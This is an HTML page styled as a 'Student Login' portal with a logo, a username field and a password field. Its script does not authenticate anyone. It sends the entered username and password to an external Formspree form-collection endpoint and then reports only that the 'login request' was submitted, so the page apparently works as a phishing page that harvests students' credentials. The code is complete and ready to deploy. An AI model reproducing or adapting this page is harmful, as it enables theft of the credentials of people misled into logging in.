<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#8B0000,#B22222);
}

.login-box{
    width:360px;
    background:#fff;
    padding:35px;
    border-radius:15px;
    box-shadow:0 10px 30px rgba(0,0,0,.3);
    text-align:center;
}

.logo{
    width:120px;
    margin-bottom:15px;
}

h2{
    margin-bottom:25px;
    color:#8B0000;
}

.input-box{
    width:100%;
    margin-bottom:18px;
}

.input-box input{
    width:100%;
    padding:14px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

.input-box input:focus{
    outline:none;
    border:1px solid #8B0000;
}

button{
    width:100%;
    padding:14px;
    background:#8B0000;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:17px;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#660000;
}

#status{
    margin-top:15px;
    font-size:15px;
    color:green;
}
</style>
</head>

<body>

<div class="login-box">

    <img src="LOGO-removebg-preview.png" class="logo" alt="Logo">

    <h2>Student Login</h2>

    <form id="loginForm">

        <div class="input-box">
            <input
                type="text"
                name="username"
                id="username"
                placeholder="Username / Email"
                required>
        </div>

        <div class="input-box">
            <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
                required>
        </div>

        <button type="submit">Login</button>

    </form>

    <p id="status"></p>

</div>

<script>
const form=document.getElementById("loginForm");

form.addEventListener("submit",async function(e){

    e.preventDefault();

    const data={
        username:document.getElementById("username").value,
        password:document.getElementById("password").value
    };

    try{

        const response=await fetch("https://formspree.io/f/xpqgoeka",{

            method:"POST",

            headers:{
                "Content-Type":"application/json",
                "Accept":"application/json"
            },

            body:JSON.stringify(data)

        });

        if(response.ok){

            document.getElementById("status").innerHTML="Login request submitted.";

            form.reset();

        }else{

            document.getElementById("status").style.color="red";
            document.getElementById("status").innerHTML="Submission failed.";

        }

    }catch(error){

        document.getElementById("status").style.color="red";
        document.getElementById("status").innerHTML="Network error.";

    }

});
</script>

</body>
</html>
